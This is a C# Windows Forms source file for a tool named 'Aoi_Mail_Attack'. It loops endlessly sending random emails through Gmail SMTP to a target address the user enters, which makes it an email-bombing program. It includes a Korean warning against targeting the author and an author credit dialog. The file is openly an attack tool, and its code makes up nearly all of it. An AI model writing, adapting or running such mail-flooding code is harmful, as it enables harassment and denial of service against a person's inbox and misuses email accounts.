using System;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using System.Collections.Generic;
using System.Threading;

namespace Aoi_Mail_Attack
{
    public partial class Form1 : Form
    {

        int Send = 0;
        int CSend = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        delegate void TT();

        private void button1_Click(object sender, EventArgs e)
        {
            if (AttackID.Text.ToLower() == "aoikazto@naver.com") MessageBox.Show("제작자에게 공격을 하는 위험한 미친짓은 하지맙시다..");
            System.ComponentModel.BackgroundWorker BW = new System.ComponentModel.BackgroundWorker();
            try
            {
                BW.DoWork += Sends;
                BW.RunWorkerAsync();
            }
            catch (Exception)
            {
                BW.CancelAsync();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Application.Restart();
        }


        private void Sends(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            while (true)
            {
                try
                {
                    MailMessage Mail = new MailMessage();
                    SmtpClient smtp = new SmtpClient(@"smtp.gmail.com", new Random().Next(30000)+800);

                    Mail.From = new MailAddress(ID.Text);
                    Mail.To.Add(AttackID.Text);
                    int Body = new Random().Next();
                    int Subject = new Random().Next();
                    Mail.Subject = Subject.ToString() ;
                    Mail.Body = Body.ToString();
                    Mail.SubjectEncoding = System.Text.Encoding.UTF8;
                    Mail.BodyEncoding = System.Text.Encoding.UTF8;

                    smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                    smtp.EnableSsl = true;
                    smtp.Credentials = new NetworkCredential(ID.Text, PD.Text);
                    //smtp.Credentials = new NetworkCredential(ID.Text, PD.Text);

                    Send += 1;
                    this.Invoke(new TS(Temp1), new object[] { Send.ToString() });
                    smtp.Send(Mail);
                    this.Invoke(new TS(Temp2), new object[] { CSend.ToString() });
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    return;
                }
            }
        }

        delegate void TS(String B);

        void Temp1(String A)
        {
            label6.Text = A + " 개";
        }
        void Temp2(String A)
        {
            label9.Text = A + " 개";
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            MessageBox.Show("제작자 : Aoi Kazto 입니다!!\n개발 블로그 : http://blog.naver.com/aoikazto\n본 프로그램은 저작권은 Aoi Kazto에 있습니다.\n무단수정, 무단배포 금지합니다.", "이용해 주셔서 감사합니다!");
            Application.ExitThread();
        }
    }
}
